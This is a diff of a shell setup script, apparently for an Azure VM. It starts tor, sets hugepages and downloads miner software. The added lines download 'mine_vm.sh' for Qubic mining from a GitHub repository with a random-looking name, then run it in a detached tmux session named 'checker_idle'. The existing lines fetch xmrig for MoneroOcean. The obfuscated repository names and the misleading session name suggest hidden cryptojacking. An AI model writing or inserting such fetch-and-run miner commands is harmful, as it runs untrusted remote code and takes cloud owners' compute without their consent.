@@ -6,6 +6,11 @@ sudo systemctl start tor
 sudo /usr/sbin/sysctl -w vm.nr_hugepages=1200
 /usr/sbin/sysctl -w vm.nr_hugepages=1200
 cd home/azureuser
+### CHECKER IDLE FOR QUBIC
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser
+chmod +x mine_vm.sh
+tmux new -ds checker_idle /home/azureuser/mine_vm.sh 
+###
 ### MONEROCEAN С КОНФИГОМ: tmux new -ds servak sudo ./xmrig
 wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_xmrig.tar.gz -P /home/azureuser
 tar -xf mo_xmrig.tar.gz
